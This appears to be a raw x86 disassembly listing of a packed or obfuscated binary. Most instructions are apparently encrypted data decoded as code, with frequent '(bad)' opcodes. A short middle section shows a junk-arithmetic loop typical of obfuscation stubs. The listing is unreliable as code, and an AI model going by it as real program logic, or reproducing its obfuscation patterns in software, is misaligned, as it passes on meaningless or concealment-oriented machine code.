  41169c:	call   0x9426:0x4ec345b8
  4116a3:	pushf  
  4116a4:	xchg   BYTE PTR [ebx+0x1b],al
  4116a7:	pusha  
  4116a8:	daa    
  4116a9:	(bad)  
  4116aa:	push   edx
  4116ab:	fwait
  4116ac:	mov    al,0x33
  4116ae:	xchg   ebp,eax
  4116af:	adc    BYTE PTR [ebp+0x168f30ef],0x6b
  4116b6:	scas   al,BYTE PTR es:[edi]
  4116b7:	jbe    0x4116ec
  4116b9:	pop    ecx
  4116ba:	mov    ch,0xe
  4116bc:	in     eax,0x35
  4116be:	mov    ch,bl
  4116c0:	mov    ds,edx
  4116c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116c3:	push   ds
  4116c4:	inc    edi
  4116c5:	mov    eax,ds:0xa48b6ecb
  4116ca:	dec    esp
  4116cb:	cld    
  4116cc:	sub    ah,BYTE PTR [edx+0x6f172dd0]
  4116d2:	mov    es,WORD PTR [edx+0x448ce36d]
  4116d8:	xor    eax,0xa8b8c22f
  4116dd:	xor    dl,BYTE PTR ss:[edi]
  4116e0:	js     0x4116d4
  4116e2:	adc    al,0x8e
  4116e4:	mov    esp,0xa2bfa66b
  4116e9:	das    
  4116ea:	mov    ebx,0x13c28b98
  4116ef:	adc    ebx,DWORD PTR es:[ebp+0x57c2356f]
  4116f6:	in     al,0x5a
  4116f8:	icebp  
  4116f9:	pop    ds
  4116fa:	sub    al,0xa2
  4116fc:	jge    0x41172d
  4116fe:	and    esp,DWORD PTR [esi+0x1f250ca0]
  411704:	mov    edx,0x946c397d
  411709:	pop    edi
  41170a:	mov    bh,0xa4
  41170c:	push   eax
  41170d:	or     BYTE PTR ds:0x24185d68,ah
  411713:	push   edi
  411714:	mov    eax,0xf6dd5d77
  411719:	inc    ah
  41171b:	push   ecx
  41171c:	sahf   
  41171d:	mov    esp,0x5020f90f
  411722:	mov    ch,0x4e
  411724:	ins    BYTE PTR es:[edi],dx
  411725:	pop    edx
  411726:	std    
  411727:	mov    al,ds:0xbe9825ef
  41172c:	mov    ecx,DWORD PTR [eax]
  41172e:	or     ebp,ebp
  411730:	(bad)  
  411731:	sub    dh,BYTE PTR [edx]
  411733:	pop    ss
  411734:	out    0x2b,al
  411736:	and    ah,cl
  411738:	mov    ds:0xb369b39f,al
  41173d:	or     DWORD PTR [esi-0x12],esi
  411740:	dec    ecx
  411741:	push   ebx
  411742:	mov    ds:0x1981014a,eax
  411747:	imul   esi,DWORD PTR [edx+0x72],0xfffffffc
  41174b:	mov    ds:0x8df3e315,al
  411750:	(bad)  
  411751:	out    dx,eax
  411752:	dec    edx
  411753:	jno    0x4116f7
  411755:	jb     0x4116d9
  411757:	bound  ebx,QWORD PTR [eax]
  411759:	in     eax,0xf9
  41175b:	sub    esp,DWORD PTR [esi]
  41175d:	ror    DWORD PTR [edi+0x21ce6157],1
  411763:	mov    bh,0xdb
  411765:	sbb    BYTE PTR [ebx+edx*8],ch
  411768:	dec    BYTE PTR [edi+edx*4-0x3d647a2]
  41176f:	test   BYTE PTR [ebx],ch
  411771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411772:	mov    dh,BYTE PTR [esi]
  411774:	ins    BYTE PTR es:[edi],dx
  411775:	sar    bh,1
  411777:	enter  0xe442,0x8f
  41177b:	and    eax,0x9d4d3bba
  411780:	cmp    ah,BYTE PTR [edx+0x79]
  411783:	push   edx
  411784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411785:	lea    esp,[edx+0x63]
  411788:	sbb    BYTE PTR [eax+0x2dfa2633],dh
  41178e:	jg     0x4117ed
  411790:	xor    eax,0xe6d8e414
  411795:	ret    
  411796:	jge    0x411794
  411798:	mov    ah,0x7c
  41179a:	(bad)  [ebp+0x21]
  41179d:	cli    
  41179e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41179f:	loopne 0x4117e6
  4117a1:	jnp    0x41174f
  4117a3:	xchg   ebp,eax
  4117a4:	mov    edx,0x3fc8df4e
  4117a9:	loop   0x4117fe
  4117ab:	cs add dl,dh
  4117ae:	lahf   
  4117af:	add    BYTE PTR [eax+edi*8-0x2e],0x80
  4117b4:	mov    ecx,0x7487ba0a
  4117b9:	lahf   
  4117ba:	dec    edi
  4117bb:	lds    edx,FWORD PTR [esi+0x25]
  4117be:	add    DWORD PTR [ebp-0x14],ecx
  4117c1:	outs   dx,BYTE PTR ds:[esi]
  4117c2:	mov    ah,0x52
  4117c4:	sub    BYTE PTR [ebx+0x64],bl
  4117c7:	add    eax,0xbe583f42
  4117cc:	add    DWORD PTR [ecx],edi
  4117ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cf:	inc    BYTE PTR [edi-0x9dab26f]
  4117d5:	fcom   QWORD PTR [eax+0x12]
  4117d8:	cs int 0xdf
  4117db:	jne    0x411796
  4117dd:	outs   dx,BYTE PTR ds:[esi]
  4117de:	inc    ebp
  4117df:	push   edi
  4117e0:	scas   eax,DWORD PTR es:[edi]
  4117e1:	pop    ds
  4117e2:	mov    esi,edx
  4117e4:	retf   0x63f7
  4117e7:	repnz add DWORD PTR [ecx],edx
  4117ea:	cmp    esp,edx
  4117ec:	sbb    ebx,esi
  4117ee:	frstor [ebx-0x76]
  4117f1:	lds    esp,FWORD PTR [edi+0x50]
  4117f4:	sbb    al,0x7d
  4117f6:	fwait
  4117f7:	inc    eax
  4117f8:	mov    ah,0x22
  4117fa:	loop   0x41185f
  4117fc:	pop    esp
  4117fd:	push   ds
  4117fe:	inc    ebp
  4117ff:	jg     0x411874
  411801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411802:	mov    dh,0xc6
  411804:	inc    esp
  411805:	cld    
  411806:	call   0x3707:0x961871f3
  41180d:	push   ecx
  41180e:	or     esp,DWORD PTR [ebx-0x4f]
  411811:	dec    edx
  411812:	xchg   DWORD PTR [esi-0x6a],esp
  411815:	jecxz  0x411862
  411817:	adc    eax,0x5dbdcd0d
  41181c:	outs   dx,BYTE PTR ds:[esi]
  41181d:	add    BYTE PTR [esi],bh
  41181f:	loop   0x4117cb
  411821:	add    esi,DWORD PTR [ebx-0x60]
  411824:	loopne 0x411856
  411826:	popf   
  411827:	cmp    ebp,DWORD PTR [edi]
  411829:	inc    edi
  41182a:	push   edx
  41182b:	scas   al,BYTE PTR es:[edi]
  41182c:	stc    
  41182d:	(bad)  
  41182e:	rcr    DWORD PTR [eax+eiz*8-0x43],cl
  411832:	in     eax,dx
  411833:	lock xchg ebp,eax
  411835:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  411837:	das    
  411838:	xor    ah,ch
  41183a:	fnstenv [ebp+0x235d0a0e]
  411840:	call   0x2069653a
  411845:	hlt    
  411846:	out    0x3a,eax
  411848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411849:	fld    DWORD PTR [ebx-0xd]
  41184c:	sub    esp,DWORD PTR [ebx]
  41184e:	nop
  41184f:	sbb    dl,bl
  411851:	hlt    
  411852:	jl     0x411830
  411854:	jne    0x411831
  411856:	mov    bl,0xc
  411858:	add    eax,DWORD PTR [edi+eax*4]
  41185b:	sub    DWORD PTR [esp+ecx*4+0x67efe2cf],ebx
  411862:	out    dx,al
  411863:	mov    dh,0x9f
  411865:	rcr    DWORD PTR [eax],1
  411867:	rcr    BYTE PTR [esi+0x3fbcea82],1
  41186d:	retf   
  41186e:	mov    ah,dl
  411870:	pop    ecx
  411871:	cwde   
  411872:	push   edx
  411873:	out    dx,eax
  411874:	and    esp,ebp
  411876:	sub    bh,bl
  411878:	ins    BYTE PTR es:[edi],dx
  411879:	push   ss
  41187a:	push   0x24
  41187c:	fst    DWORD PTR [esi+0x2b]
  41187f:	ret    0x19cd
  411882:	push   ebx
  411883:	or     eax,0x85f75293
  411888:	mov    bl,0xf6
  41188a:	loopne 0x41187d
  41188c:	jbe    0x4118d5
  41188e:	push   ebx
  41188f:	jmp    0xcabdaab2
  411894:	ret    
  411895:	cwde   
  411896:	jge    0x41189a
  411898:	call   0x7b47c712
  41189d:	test   DWORD PTR [edx-0x64b483a7],0xc20da7ff
  4118a7:	repnz mov ds:0x73cc1296,al
  4118ad:	(bad)
  4118b0:	(bad)  [ecx+0x45897f9b]
  4118b6:	inc    esi
  4118b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118b8:	xchg   ebx,eax
  4118b9:	dec    edx
  4118ba:	mov    ah,0x8e
  4118bc:	int    0xff
  4118be:	and    cl,BYTE PTR [edi+0x5583c2a3]
  4118c4:	std    
  4118c5:	cmp    BYTE PTR [eax-0x65],cl
  4118c8:	(bad)  
  4118c9:	call   FWORD PTR [ecx+0x60]
  4118cc:	sub    bh,al
  4118ce:	imul   esi,DWORD PTR [edx],0xffffffc3
  4118d1:	xchg   edx,eax
  4118d2:	icebp  
  4118d3:	out    dx,al
  4118d4:	je     0x411879
  4118d6:	jbe    0x411922
  4118d8:	ins    DWORD PTR es:[edi],dx
  4118d9:	push   edx
  4118da:	or     eax,DWORD PTR [ebx+0xa]
  4118dd:	fwait
  4118de:	cwde   
  4118df:	inc    esp
  4118e0:	dec    esp
  4118e1:	and    DWORD PTR [ebx+eiz*1],esi
  4118e4:	or     BYTE PTR [esi],bh
  4118e6:	iret   
  4118e7:	cmp    eax,0x1037418d
  4118ec:	inc    ebp
  4118ed:	pop    ebx
  4118ee:	mov    BYTE PTR [edi],bl
  4118f0:	and    eax,0x7d918524
  4118f5:	cmp    eax,0x15bb7eca
  4118fa:	push   ecx
  4118fb:	dec    ecx
  4118fc:	mov    edi,DWORD PTR [edx]
  4118fe:	stos   BYTE PTR es:[edi],al
  4118ff:	push   edx
  411900:	sub    esp,DWORD PTR [edi]
  411902:	push   ss
  411903:	xchg   ebp,eax
  411904:	popa   
  411905:	loopne 0x4118a6
  411907:	adc    bl,BYTE PTR [edi]
  411909:	or     bl,BYTE PTR [edx+ebp*8-0x7c]
  41190d:	(bad)  
  41190e:	in     eax,dx
  41190f:	scas   eax,DWORD PTR es:[edi]
  411910:	aad    0xe0
  411912:	popa   
  411913:	add    ebp,ebx
  411915:	ja     0x41197d
  411917:	xor    BYTE PTR [ebx-0xae7e9ca],0x25
  41191e:	cdq    
  41191f:	cmp    DWORD PTR [edx+0x3bd120f3],edi
  411925:	mov    al,ds:0x5b713687
  41192a:	xchg   edx,eax
  41192b:	add    esi,ebx
  41192d:	and    al,0x9d
  41192f:	pop    esi
  411930:	daa    
  411931:	stc    
  411932:	mov    esp,0x56d9fb1c
  411937:	mov    al,0x1c
  411939:	retf   
  41193a:	mov    WORD PTR [ecx],es
  41193c:	pop    eax
  41193d:	and    eax,0x89630e1e
  411942:	add    al,0xba
  411944:	fldl2t 
  411946:	xchg   BYTE PTR [ebp+0x114d5a06],dl
  41194c:	dec    ecx
  41194d:	sub    ch,al
  41194f:	mov    bl,0xd0
  411951:	xchg   edi,eax
  411952:	sbb    esp,ebx
  411954:	bound  esi,QWORD PTR [ebp-0x2f]
  411957:	inc    DWORD PTR [edx]
  411959:	push   0xc9d46a2a
  41195e:	push   ebp
  41195f:	ror    edx,0x9d
  411962:	sub    ah,BYTE PTR ds:0xe043b57e
  411968:	dec    ecx
  411969:	out    dx,eax
  41196a:	das    
  41196b:	aas    
  41196c:	jmp    0x411971
  41196e:	cdq    
  41196f:	test   al,0x79
  411971:	in     eax,0x9e
  411973:	pop    ebp
  411974:	dec    eax
  411975:	gs js  0x4119b7
  411978:	daa    
  411979:	dec    ecx
  41197a:	and    edi,DWORD PTR [edx]
  41197c:	jecxz  0x4119b9
  41197e:	cli    
  41197f:	cwde   
  411980:	xchg   esi,eax
  411981:	les    ecx,FWORD PTR [edx+0x751dca05]
  411987:	aaa    
  411988:	(bad)  
  411989:	dec    ebx
  41198a:	xchg   esp,eax
  41198b:	jns    0x4119e4
  41198d:	push   eax
  41198e:	mov    ebx,0xaf8e339a
  411993:	ins    DWORD PTR es:[edi],dx
  411994:	pop    edi
  411995:	sahf   
  411996:	leave  
  411997:	pop    gs
  411999:	fdivp  st(1),st
  41199b:	pop    esi
  41199c:	jae    0x4119d6
  41199e:	int    0x92
  4119a0:	rcl    BYTE PTR [edx+0x26],1
  4119a3:	sub    BYTE PTR [ebp-0x9],cl
  4119a6:	les    esi,FWORD PTR [ebx]
  4119a8:	fisttp QWORD PTR [ecx]
  4119aa:	and    edi,ebx
  4119ac:	and    ebx,DWORD PTR [edi]
  4119ae:	ret    0xb545
  4119b1:	xchg   ebp,eax
  4119b2:	push   ebp
  4119b3:	mov    ch,0xd
  4119b5:	xor    bh,BYTE PTR [eax]
  4119b7:	ret    
  4119b8:	cmp    bl,BYTE PTR [ecx+0x74da37f1]
  4119be:	dec    esp
  4119bf:	ret    
  4119c0:	retf   0x41be
  4119c3:	push   cs
  4119c4:	mov    edi,cs
  4119c6:	mov    eax,0x79bc7c0d
  4119cb:	stos   BYTE PTR es:[edi],al
  4119cc:	inc    esi
  4119cd:	(bad)  
  4119ce:	lahf   
  4119cf:	mov    bh,0x14
  4119d1:	push   eax
  4119d2:	ins    BYTE PTR es:[edi],dx
  4119d3:	adc    DWORD PTR [ebp-0x31],edi
  4119d6:	pop    edi
  4119d7:	xor    eax,DWORD PTR [eax-0x56ce4b0b]
  4119dd:	es dec ebp
  4119df:	mov    ds:0x4295d10a,al
  4119e4:	mov    ecx,0xfac2b70a
  4119e9:	ficomp DWORD PTR [ebp-0x5efb30f2]
  4119ef:	xchg   DWORD PTR [ecx-0x7cd3578a],ebp
  4119f5:	neg    BYTE PTR ds:0x78dfd973
  4119fb:	mov    cl,0x9d
  4119fd:	lods   eax,DWORD PTR ds:[esi]
  4119fe:	jo     0x411a2d
  411a00:	push   0x70f5e9de
  411a05:	mov    ecx,0x7b535e79
  411a0a:	ror    DWORD PTR [edi+0x2debd3bc],cl
  411a10:	jecxz  0x4119c6
  411a12:	clc    
  411a13:	dec    edx
  411a14:	outs   dx,DWORD PTR ds:[esi]
  411a15:	mov    bx,0xc3ad
  411a19:	pop    eax
  411a1a:	popa   
  411a1b:	popa   
  411a1c:	add    BYTE PTR [eax-0x5e28d5f5],0xd1
  411a23:	js     0x411a16
  411a25:	adc    al,0xd9
  411a27:	in     al,dx
  411a28:	xchg   ebx,eax
  411a29:	xchg   ecx,eax
  411a2a:	aas    
  411a2b:	mov    bh,0x6
  411a2d:	inc    esi
  411a2e:	fsub   QWORD PTR [eax]
  411a30:	in     eax,0xb1
  411a32:	int3   
  411a33:	in     eax,dx
  411a34:	icebp  
  411a35:	fistp  QWORD PTR [edx]
  411a37:	cli    
  411a38:	sub    cl,dl
  411a3a:	add    ch,BYTE PTR [ebx+0x20]
  411a3d:	shr    ecx,1
  411a3f:	(bad)
  411a43:	push   edi
  411a44:	or     al,0xc5
  411a46:	mov    al,ds:0x3f2eff51
  411a4b:	xchg   esp,eax
  411a4c:	addr16 xchg edi,eax
  411a4e:	sub    eax,0x47e03b28
  411a53:	pop    eax
  411a54:	xor    al,0x62
  411a56:	and    eax,eax
  411a58:	sbb    eax,0x895cca45
  411a5d:	and    eax,DWORD PTR [eax-0x53]
  411a60:	push   esi
  411a61:	fadd   DWORD PTR [edi+0x773224a0]
  411a67:	xor    eax,0x1cc9a3ca
  411a6c:	inc    ebx
  411a6d:	and    edx,0x6b4b8496
  411a73:	nop
  411a74:	cdq    
  411a75:	pushf  
  411a76:	ins    DWORD PTR es:[edi],dx
  411a77:	call   0xd879:0xde825d49
  411a7e:	inc    esi
  411a7f:	sub    cl,BYTE PTR [ebx]
  411a81:	retf   
  411a82:	adc    BYTE PTR [edi-0x59d9f12c],0x7e
  411a89:	ror    BYTE PTR [ebp+edi*8+0x3d],cl
  411a8d:	sbb    DWORD PTR [eax],edi
  411a8f:	mov    bh,0x43
  411a91:	mov    ebp,0xb5c0306e
  411a96:	fst    DWORD PTR [esi]
  411a98:	cdq    
  411a99:	hlt    
  411a9a:	and    eax,0x2314b6c1
  411a9f:	xchg   esi,eax
  411aa0:	add    DWORD PTR [edi+0x7f],ecx
  411aa3:	imul   bh
  411aa5:	jecxz  0x411a5c
  411aa7:	retf   
  411aa8:	mov    esp,0xe8558bbf
  411aad:	xor    edx,eax
  411aaf:	add    edx,esi
  411ab1:	cmp    ecx,edx
  411ab3:	mov    ecx,DWORD PTR [ebp-0x14]
  411ab6:	mov    DWORD PTR [ebp+0x8],ecx
  411ab9:	mov    ecx,DWORD PTR [ebp+0x8]
  411abc:	je     0x4164f7
  411ac2:	xor    ecx,eax
  411ac4:	add    ecx,esi
  411ac6:	mov    ecx,0x242ebe9
  411acb:	je     0x411bdb
  411ad1:	mov    edx,DWORD PTR [ebp+0x8]
  411ad4:	mov    ebx,DWORD PTR [ebp-0x8]
  411ad7:	xor    edx,eax
  411ad9:	xor    ebx,eax
  411adb:	sub    edx,ebx
  411add:	sub    edx,esi
  411adf:	xor    edx,eax
  411ae1:	mov    DWORD PTR [ebp+0x8],edx
  411ae4:	mov    edx,DWORD PTR [ebp+0x8]
  411ae7:	mov    ebx,DWORD PTR [ebp-0x58]
  411aea:	add    edx,0x5708c4
  411af0:	imul   edx,ebx
  411af3:	mov    DWORD PTR [ebp-0x58],edx
  411af6:	mov    edx,DWORD PTR [ebp+0x8]
  411af9:	mov    ebx,DWORD PTR [ebp-0x54]
  411afc:	add    edx,0x64f8da
  411b02:	or     edx,ebx
  411b04:	mov    DWORD PTR [ebp-0x54],edx
  411b07:	mov    edx,DWORD PTR [ebp+0x8]
  411b0a:	mov    ebx,DWORD PTR [ebp-0x50]
  411b0d:	add    edx,ecx
  411b0f:	xor    edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x50],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b1a:	add    edx,edi
  411b1c:	and    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x4c],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x48]
  411b27:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b2e:	mov    DWORD PTR [ebp-0x48],edx
  411b31:	mov    edx,DWORD PTR [ebp+0x8]
  411b34:	mov    ebx,0xfa5e15e2
  411b39:	sub    ebx,edx
  411b3b:	add    ebx,DWORD PTR [ebp-0x44]
  411b3e:	mov    DWORD PTR [ebp-0x44],ebx
  411b41:	mov    edx,DWORD PTR [ebp+0x8]
  411b44:	xor    edx,eax
  411b46:	add    edx,esi
  411b48:	jne    0x411ad1
  411b4e:	jmp    0x411bdb
  411b53:	mov    edx,DWORD PTR [ebp-0x14]
  411b56:	mov    DWORD PTR [ebp+0x8],edx
  411b59:	jmp    0x411bce
  411b5e:	mov    edx,DWORD PTR [ebp+0x8]
  411b61:	mov    ebx,DWORD PTR [ebp-0x8]
  411b64:	xor    edx,eax
  411b66:	xor    ebx,eax
  411b68:	sub    edx,ebx
  411b6a:	sub    edx,esi
  411b6c:	xor    edx,eax
  411b6e:	mov    DWORD PTR [ebp+0x8],edx
  411b71:	mov    edx,DWORD PTR [ebp+0x8]
  411b74:	mov    ebx,DWORD PTR [ebp-0x58]
  411b77:	add    edx,0x5708c4
  411b7d:	imul   edx,ebx
  411b80:	mov    DWORD PTR [ebp-0x58],edx
  411b83:	mov    edx,DWORD PTR [ebp+0x8]
  411b86:	mov    ebx,DWORD PTR [ebp-0x54]
  411b89:	add    edx,0x64f8da
  411b8f:	or     edx,ebx
  411b91:	mov    DWORD PTR [ebp-0x54],edx
  411b94:	mov    edx,DWORD PTR [ebp+0x8]
  411b97:	mov    ebx,DWORD PTR [ebp-0x50]
  411b9a:	add    edx,ecx
  411b9c:	xor    edx,ebx
  411b9e:	mov    DWORD PTR [ebp-0x50],edx
  411ba1:	mov    edx,DWORD PTR [ebp+0x8]
  411ba4:	mov    ebx,DWORD PTR [ebp-0x4c]
  411ba7:	add    edx,edi
  411ba9:	and    edx,ebx
  411bab:	mov    DWORD PTR [ebp-0x4c],edx
  411bae:	mov    edx,DWORD PTR [ebp+0x8]
  411bb1:	mov    ebx,DWORD PTR [ebp-0x48]
  411bb4:	lea    edx,[ebx+edx*1+0x241fc1f]
  411bbb:	mov    DWORD PTR [ebp-0x48],edx
  411bbe:	mov    edx,DWORD PTR [ebp+0x8]
  411bc1:	mov    ebx,0xfa5e15e2
  411bc6:	sub    ebx,edx
  411bc8:	add    ebx,DWORD PTR [ebp-0x44]
  411bcb:	mov    DWORD PTR [ebp-0x44],ebx
  411bce:	mov    edx,DWORD PTR [ebp+0x8]
  411bd1:	xor    edx,eax
  411bd3:	add    edx,esi
  411bd5:	jne    0x411b5e
  411bdb:	mov    edx,DWORD PTR [ebp-0x14]
  411bde:	mov    DWORD PTR [ebp+0x8],edx
  411be1:	jmp    0x4163be
  411be6:	jmp    0x413f9a
  411beb:	rcr    BYTE PTR [ecx-0x6f],1
  411bee:	and    BYTE PTR [ecx+0x70],dh
  411bf1:	ror    DWORD PTR [ecx+0x1e6f5998],1
  411bf7:	shl    ch,cl
  411bf9:	jnp    0x411c2e
  411bfb:	dec    ebx
  411bfc:	test   eax,0x5feb7c7c
  411c01:	jl     0x411c7f
  411c03:	dec    eax
  411c04:	and    ch,BYTE PTR [edx-0x7b78ae8a]
  411c0a:	ss in  eax,0x6e
  411c0d:	mov    ah,0x15
  411c0f:	add    eax,0xdecd9d86
  411c14:	(bad)  
  411c15:	xchg   edi,eax
  411c16:	outs   dx,DWORD PTR ds:[esi]
  411c17:	jnp    0x411bfd
  411c19:	lea    edi,[ecx-0x65]
  411c1c:	nop
  411c1d:	ss xchg ebp,esp
  411c20:	mov    ch,0x83
  411c22:	jnp    0x411bfa
  411c24:	inc    edx
  411c25:	fisub  DWORD PTR [edx+0x85f76b]
  411c2b:	push   eax
  411c2c:	adc    BYTE PTR [edi],ch
  411c2e:	jae    0x411bb6
  411c30:	fdivr  QWORD PTR [ecx+edx*4+0x7c]
  411c34:	data16 add al,0x2f
  411c37:	mov    WORD PTR [edi+0x6e],ss
  411c3a:	push   edx
  411c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c3c:	hlt    
  411c3d:	gs inc ebx
  411c3f:	sbb    edi,DWORD PTR [edi-0x269da21a]
  411c45:	jmp    0x411c2d
  411c47:	into   
  411c48:	pop    ebx
  411c49:	adc    edi,DWORD PTR [ecx]
  411c4b:	jns    0x411c8a
  411c4d:	in     al,dx
  411c4e:	inc    esi
  411c4f:	pop    esp
  411c50:	mov    ah,0x5c
  411c52:	shl    cl,0xae
  411c55:	imul   al
  411c57:	std    
  411c58:	ds es push ebp
  411c5b:	in     al,0x4e
  411c5d:	xchg   edi,eax
  411c5e:	jmp    0x4b919709
  411c63:	imul   esp,DWORD PTR [ebx+0x3c6ebf09],0x96a620ec
  411c6d:	sub    eax,0xc0c0af19
  411c72:	cld    
  411c73:	bound  edx,QWORD PTR [edx+eax*8-0x2e]
  411c77:	or     DWORD PTR [esp+edi*1],edi
  411c7a:	(bad)  
  411c7b:	imul   esp,DWORD PTR [edi-0x33],0x5a
  411c7f:	inc    esp
  411c80:	pusha  
  411c81:	push   ebp
  411c82:	mov    ebx,0xaca62944
  411c87:	dec    edi
  411c88:	pusha  
  411c89:	ficomp DWORD PTR [edi]
  411c8b:	xchg   ecx,eax
  411c8c:	das    
  411c8d:	inc    ebp
  411c8e:	xor    bl,BYTE PTR ds:[edx+0x18]
  411c92:	retf   0x3d59
  411c95:	aaa    
  411c96:	shl    BYTE PTR [eax+eax*4],cl
  411c99:	ret    
  411c9a:	jecxz  0x411c20
  411c9c:	xchg   ebp,eax
  411c9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c9e:	jb     0x411cbc
  411ca0:	pop    ebp
  411ca1:	inc    esi
  411ca2:	xchg   edx,eax
  411ca3:	cmp    BYTE PTR [ecx-0x6f],0x71
  411ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ca8:	mov    esp,fs
  411caa:	jae    0x411c78
  411cac:	scas   al,BYTE PTR es:[edi]
  411cad:	cmp    al,0xe2
  411caf:	das    
  411cb0:	(bad)
  411cb3:	aaa    
  411cb4:	clc    
  411cb5:	pop    edx
  411cb6:	neg    bh
  411cb8:	mov    ebp,0xdb866e40
  411cbd:	inc    eax
  411cbe:	jns    0x411d27
  411cc0:	jae    0x411d35
  411cc2:	sub    BYTE PTR [ecx-0x59],bl
  411cc5:	scas   al,BYTE PTR es:[edi]
  411cc6:	mov    eax,0xc928d8f
  411ccb:	pop    ebp
  411ccc:	mov    ebx,0x31f4065
  411cd1:	call   0x8400d3cf
  411cd6:	adc    BYTE PTR [ebp+0x19624a1f],bl
  411cdc:	call   0xc20dfc78
  411ce1:	pop    eax
  411ce2:	lds    edi,FWORD PTR [eax]
  411ce4:	cmp    eax,0x329bbb14
  411ce9:	fisubr DWORD PTR [edi]
  411ceb:	lock push eax
  411ced:	ins    BYTE PTR es:[edi],dx
  411cee:	pop    ebp
  411cef:	(bad)  
  411cf1:	dec    ebp
  411cf2:	add    eax,0x1075df38
  411cf7:	adc    edi,ecx
  411cf9:	icebp  
  411cfa:	ss cmp al,0x50
  411cfd:	retf   0x6130
  411d00:	adc    al,0xb4
  411d02:	pop    ebx
  411d03:	les    eax,FWORD PTR [ebp+0x7dcc1867]
  411d09:	stos   DWORD PTR es:[edi],eax
  411d0a:	imul   edx
  411d0c:	ss add esi,esi
  411d0f:	xor    eax,0x98ed01f6
  411d14:	xchg   edi,eax
  411d15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d16:	ret    
  411d17:	(bad)  
  411d18:	fistp  DWORD PTR ds:0xb7e86bde
  411d1e:	lock adc bl,BYTE PTR [ecx-0x10]
  411d22:	cli    
  411d23:	inc    ebp
  411d24:	cwde   
  411d25:	(bad)  
  411d27:	cld    
  411d28:	ins    BYTE PTR es:[edi],dx
  411d29:	mov    eax,0x9410e2a0
  411d2e:	test   BYTE PTR [ebp+ebx*4+0x7cc61d6b],bh
  411d35:	aas    
  411d36:	pop    edi
  411d37:	mov    edi,0x89245bcd
  411d3c:	cmp    ebp,DWORD PTR [ebx+0x31]
  411d3f:	sahf   
  411d40:	fcomip st,st(1)
  411d42:	dec    ebp
  411d43:	push   es
  411d44:	cld    
  411d45:	in     al,dx
  411d46:	loop   0x411d4e
  411d48:	pushf  
  411d49:	sub    edi,DWORD PTR ds:0x9147bf83
  411d4f:	push   ebp
  411d50:	and    al,0x11
  411d52:	mov    eax,0x48abc805
  411d57:	inc    esp
  411d58:	mov    ds:0xee9853fb,eax
  411d5d:	pusha  
  411d5e:	icebp  
  411d5f:	inc    ebp
  411d60:	es call 0x1650:0x4f365749
  411d68:	nop
  411d69:	fidivr WORD PTR [esi+ebp*1-0x309ae9c]
  411d70:	ret    0xeace
  411d73:	inc    eax
  411d74:	das    
  411d75:	push   0x38
  411d77:	and    ecx,0xffffffb9
  411d7a:	jne    0x411d8e
  411d7c:	jecxz  0x411d32
  411d7e:	mov    bl,0xb2
  411d80:	sub    esp,DWORD PTR [ebx-0x77986c2e]
  411d86:	test   BYTE PTR [edi-0x65],al
  411d89:	or     eax,0x133742e
  411d8e:	adc    BYTE PTR [ecx],0xb
  411d91:	push   edi
  411d92:	cmp    eax,0x3a86238b
  411d97:	push   ds
  411d98:	gs inc ebp
  411d9a:	or     DWORD PTR [bp+di],edi
  411d9d:	adc    cl,BYTE PTR [edi]
  411d9f:	pop    eax
  411da0:	mov    ecx,0x106548b3
  411da5:	or     ecx,DWORD PTR [ebx+0x20]
  411da8:	xor    eax,0x86196c6d
  411dad:	popf   
  411dae:	stos   BYTE PTR es:[edi],al
  411daf:	inc    BYTE PTR [ebx+0x7567e34d]
  411db5:	(bad)  
  411db6:	aas    
  411db7:	push   ebp
  411db8:	in     eax,0xb
  411dba:	xchg   esi,eax
  411dbb:	out    dx,al
  411dbc:	and    eax,0xbc56191b
  411dc1:	iret   
  411dc2:	push   ecx
  411dc3:	imul   edi,DWORD PTR [edi+0x63],0xffffffa6
  411dc7:	jmp    0x411e48
  411dc9:	call   0x9aa38a8a
  411dce:	adc    eax,0xec382a9c
  411dd3:	shl    bh,1
  411dd5:	inc    ecx
  411dd6:	popf   
  411dd7:	stos   BYTE PTR es:[edi],al
  411dd8:	stos   DWORD PTR es:[edi],eax
  411dd9:	loop   0x411df6
  411ddb:	les    ecx,FWORD PTR [ebp-0x50]
  411dde:	add    dl,0xd4
  411de1:	in     eax,dx
  411de2:	jnp    0x411d76
  411de4:	inc    eax
  411de5:	cdq    
  411de6:	sub    DWORD PTR [eax-0x2b],esp
  411de9:	ja     0x411d9c
  411deb:	stos   BYTE PTR es:[edi],al
  411dec:	retf   0x8e82
  411def:	call   0x7fce0466
  411df4:	or     DWORD PTR [ebx],ebx
  411df6:	mov    eax,0x37b8d7a8
  411dfb:	ret    0xa560
  411dfe:	retf   
  411dff:	xchg   edx,eax
  411e00:	lds    esp,FWORD PTR [edi-0x28e28c6]
  411e06:	mov    bl,0x20
  411e08:	xor    BYTE PTR [bx+di],dl
  411e0b:	and    ah,BYTE PTR cs:[eax-0x2b]
  411e0f:	sub    DWORD PTR [edx+0xcc8bcc0],edx
  411e15:	xchg   ecx,eax
  411e16:	mov    WORD PTR [ecx+ebp*2+0x1a],ds
  411e1a:	mov    dh,0x15
  411e1c:	cmp    BYTE PTR [eax+0xd],0xfd
  411e20:	fcom   QWORD PTR [ecx-0x4]
  411e23:	xchg   esp,edx
  411e25:	adc    ch,ah
  411e27:	mov    ecx,0xd22fd81d
  411e2c:	mov    al,0xa5
  411e2e:	je     0x411e7f
  411e30:	shr    edi,0xf6
